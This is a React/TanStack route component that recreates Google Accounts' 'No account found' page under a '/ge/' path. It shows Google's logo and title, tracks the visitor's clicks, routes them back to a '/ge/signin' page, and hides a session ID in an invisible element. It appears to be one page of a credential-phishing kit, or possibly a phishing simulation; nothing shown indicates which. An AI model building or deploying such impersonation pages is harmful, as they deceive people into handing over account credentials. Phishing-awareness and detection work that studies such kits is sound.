import { createFileRoute } from "@tanstack/react-router";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/noaccount")({
  head: () => ({
    meta: [
      { title: "No account found - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeNoAccountPage,
});

const GE_NOACCOUNT_CSS = `
${GE_SHELL_CSS}

/* Single-column content in the same wide card shell */
.ge-noaccount .ge-card {
  flex-direction: column;
}
@media (min-width: 900px) {
  .ge-noaccount .ge-card {
    flex-direction: column;
    align-items: stretch;
  }
}

.ge-noaccount-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
  width: 100%;
  max-width: 100%;
}
@media (min-width: 900px) {
  /* Match left-column content width of two-pane pages */
  .ge-noaccount-body {
    max-width: calc(50% - var(--wf-gutw) / 2);
  }
}

.ge-noaccount .ge-title {
  margin-top: 16px;
}
@media (min-width: 840px) {
  .ge-noaccount .ge-title {
    margin-top: 24px;
  }
}

.ge-noaccount-sub {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}

.ge-noaccount-actions {
  display: flex;
  flex-direction: row-reverse;
  align-items: center;
  justify-content: flex-start;
  margin-top: auto;
  padding-top: 32px;
  width: 100%;
}

.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-try {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-try:hover {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
`;

function GeNoAccountPage() {
  const { trackClick, geNavigate, sessionId } = useGeTracking();

  const handleTryAgain = () => {
    trackClick("Try again");
    geNavigate("/ge/signin");
  };

  return (
    <div className="ge-shell ge-noaccount">
      <GeFontStyle />
      <style>{GE_NOACCOUNT_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-noaccount-body">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">No account found</h1>
          <p className="ge-noaccount-sub">
            There{"\u2019"}s no Google Account with the info you provided.
          </p>
        </div>

        <div className="ge-noaccount-actions">
          <button type="button" className="ge-btn ge-btn-try" onClick={handleTryAgain}>
            Try again
          </button>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
